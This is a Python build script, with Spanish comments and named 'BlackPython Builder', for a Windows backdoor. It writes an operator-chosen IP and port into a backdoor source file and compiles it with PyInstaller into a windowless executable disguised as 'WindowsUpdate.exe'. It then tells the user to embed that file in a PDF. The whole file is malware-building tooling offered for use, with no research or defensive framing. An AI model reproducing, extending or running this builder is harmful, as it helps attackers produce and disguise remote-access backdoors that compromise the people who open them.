#!/usr/bin/env python3
import os
import glob
import shutil
import subprocess
from datetime import datetime

# Configuración
PAYLOAD_NAME = "WindowsUpdate"
OUTPUT_DIR = "build"
TEMP_DIR = os.path.join(OUTPUT_DIR, "temp")

def clean_previous():
    """Elimina builds anteriores"""
    for folder in [OUTPUT_DIR, "dist", TEMP_DIR]:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    for f in glob.glob("*.spec"):
        os.remove(f)

def modify_backdoor_source(ip, port):
    """Modifica el archivo backdoor.py con la IP y puerto especificados"""
    backdoor_path = "core/backdoor.py"
    temp_backdoor_path = os.path.join(TEMP_DIR, "backdoor_temp.py")
    
    with open(backdoor_path, "r") as f:
        content = f.read()
    
    # Reemplazar los valores de host y port en el constructor
    content = content.replace(
        'def __init__(self, host, port):',
        f'def __init__(self, host="{ip}", port={port}):'
    )
    
    os.makedirs(TEMP_DIR, exist_ok=True)
    with open(temp_backdoor_path, "w") as f:
        f.write(content)
    
    return temp_backdoor_path

def compile_payload(ip="127.0.0.1", port=4444):
    """Compila el payload para Windows con IP y puerto específicos"""
    print("[*] Compilando payload...")
    
    os.makedirs(TEMP_DIR, exist_ok=True)
    
    # Modificar el archivo backdoor.py con IP y puerto
    backdoor_file = modify_backdoor_source(ip, port)
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", PAYLOAD_NAME,
        "--distpath", OUTPUT_DIR,
        "--workpath", TEMP_DIR,
        "--specpath", TEMP_DIR,
        "--log-level=ERROR",
        backdoor_file
    ]
    
    try:
        subprocess.run(cmd, check=True)
        
        # Renombrar si es necesario (Linux -> Windows)
        if os.path.exists(f"{OUTPUT_DIR}/{PAYLOAD_NAME}"):
            os.rename(f"{OUTPUT_DIR}/{PAYLOAD_NAME}", f"{OUTPUT_DIR}/{PAYLOAD_NAME}.exe")
            
        print(f"[+] Payload compilado: {OUTPUT_DIR}/{PAYLOAD_NAME}.exe")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error crítico durante la compilación")
        print("Posibles soluciones:")
        print("1. Instala binutils: sudo pacman -S binutils")
        print("2. Verifica permisos: chmod 755 build/")
        print(f"3. Detalles técnicos: {str(e)}")
        exit(1)

def main():
    import argparse
    parser = argparse.ArgumentParser(description="BlackPython Builder")
    parser.add_argument("--ip", default="127.0.0.1", help="IP para el backdoor")
    parser.add_argument("--port", type=int, default=4444, help="Puerto para el backdoor")
    args = parser.parse_args()

    print(f"\n{'='*50}")
    print(f"  BlackPython Builder - {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    print(f"{'='*50}")
    
    clean_previous()
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    compile_payload(args.ip, args.port)
    
    print("\n[+] Proceso completado exitosamente!")
    print(f"\nInstrucciones:")
    print(f"1. Archivo generado: {OUTPUT_DIR}/{PAYLOAD_NAME}.exe")
    print(f"2. Usa 'python main.py bind' para incrustarlo en un PDF")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Proceso cancelado")
        exit(0)
